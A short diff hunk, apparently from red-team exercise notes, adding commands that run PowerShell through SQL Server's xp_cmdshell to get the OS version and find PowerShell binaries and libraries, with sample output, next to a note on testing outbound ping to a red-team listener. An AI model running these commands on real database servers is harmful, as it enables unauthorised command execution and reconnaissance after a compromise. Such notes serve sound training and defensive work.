@@ -154,6 +154,24 @@ NULL
 (2 rows affected)
 (return status = 0)
 
+1> xp_cmdshell 'powershell.exe [environment]::OSVersion.Version'
+output
+Major  Minor  Build  Revision
+-----  -----  -----  --------
+10     0      17133  0 
+
+
+#Finds powershell executable locations
+2> exec xp_cmdshell 'dir /B /S powershell.exe /S system.management.automation.dll';
+3> go
+output
+C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe
+NULL
+(2 rows affected)
+(return status = 0)
+output
+
+
 
 #Check if can ping (BlueTeam Database SQL Server 2019)
 #tcpdump -nni eth0 icmp (open listener on RedTeam)
